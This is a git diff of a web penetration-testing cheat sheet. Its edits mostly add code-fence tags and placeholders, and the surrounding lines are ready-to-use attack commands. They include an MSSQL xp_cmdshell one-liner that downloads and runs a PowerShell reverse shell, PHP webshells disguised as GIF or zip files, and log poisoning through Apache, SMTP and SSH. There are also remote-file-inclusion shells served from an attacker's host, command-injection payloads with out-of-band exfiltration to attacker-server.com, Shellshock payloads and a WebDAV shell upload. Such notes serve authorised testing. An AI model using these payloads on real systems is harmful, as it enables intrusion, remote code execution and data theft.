@@ -118,14 +118,14 @@ https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-Power
 
 ## Abuse MSSQL
 -> edit Invoke-PowerShellTcp.ps1, adding this:  
-```
+```powershell
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
 ```
-```
+```bash
 impacket-mssqlclient <user>@<ip> -db <database>
 ```
 ```
-xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
+xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<IP>/Invoke-PowerShellTcp.ps1\")
 ```
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
@@ -311,7 +311,7 @@ https://malwaredecoder.com/
 https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
 
 ## Git Exposed
-```
+```bash
 git-dumper http://site.com/.git .
 ```
 https://github.com/arthaud/git-dumper
@@ -391,9 +391,9 @@ $language = str_replace('../', '', $_GET['file']);
 ```
 ```
 %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
-```  
-### PHP Wrappers
+```
 
+### PHP Wrappers
 ```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
 expect://id  
@@ -420,13 +420,13 @@ https://site.com/index.php?file=index.p.phphp
   
 #### LFI + File Upload
 -> gif  
-```
+```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
 ``` 
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
 -> Zip  
 1-  
-```
+```bash
 echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php
 ```
 2-  
@@ -437,20 +437,20 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 #### Log Poisoning
 -> apache
-```
+```bash
 nc ip 80  
 <?php system($_GET[‘cmd’]); ?>  
 ```  
 or  
 1-  
-```
+```bash
 curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
 ```
 2-  
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id  
   
 -> SMTP  
-```
+```bash
 telnet ip 23
 MAIL FROM: email@gmail.com
 RCPT TO: <?php system($_GET[‘cmd’]); ?>  
@@ -458,8 +458,8 @@ http://ip/index.php?file=/var/mail/mail.log&cmd=id
 ```  
   
 -> SSH  
-```
-ssh \'<?php system($_GET['cmd']);?>'@ip  
+```bash
+ssh \'<?php system($_GET['cmd']);?>'@<IP>  
 http://ip/index.php?file=/var/log/auth.log&cmd=id
 ```  
 
@@ -499,7 +499,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ## Remote File Inclusion (RFI)
 ### RFI to Webshell with null byte for image extension bypass
-```
+```bash
 echo "<?php echo shell_exec($_GET['cmd']); ?>" > evil.txt
 python -m http.server 80
 ```
@@ -508,7 +508,7 @@ http://site.com/menu.php?file=http://<IP>/evil.php%00.png
 ```
 
 ### RFI to Webshell with txt
-```
+```bash
 echo '<?php echo shell_exec($_GET["cmd"]); ?>' > evil.txt
 python -m http.server 80
 ```
@@ -519,18 +519,18 @@ http://site.com/menu.php?file=http://<IP>/evil.txt&cmd=ipconfig
 ## OS Command Injection
 -> Special Characters
 ```
-& command
-&& command
-; command
-command %0A command
-| command
-|| command
-`command`
-$(command)
+& <command>
+&& <command>
+; <command>
+<command> %0A <command>
+| <command>
+|| <command>
+`<command>`
+$(<command>)
 ```
 
 -> Out Of Band - OOB Exploitation
-```
+```bash
 curl http://$(whoami).site.com/
 curl http://`whoami`.site.com/
 nslookup `whoami`.attacker-server.com &
@@ -544,12 +544,12 @@ curl http://192.168.0.20/$(whoami)
 
 ## Shellshock
 -> Detection
-```
+```bash
 nikto -h <IP> -C all
 ```
 	
 -> Exploit
-```
+```bash
 curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
 curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
 curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
@@ -557,11 +557,11 @@ curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
 
 ## WebDAV
 -> Connect to WebDAV server and send malicious file to shell
-```
+```bash
 cadaver http://<IP>/webdav
 put <shell.asp>
 ```
-```
+```bash
 curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
 ```
 https://github.com/notroj/cadaver
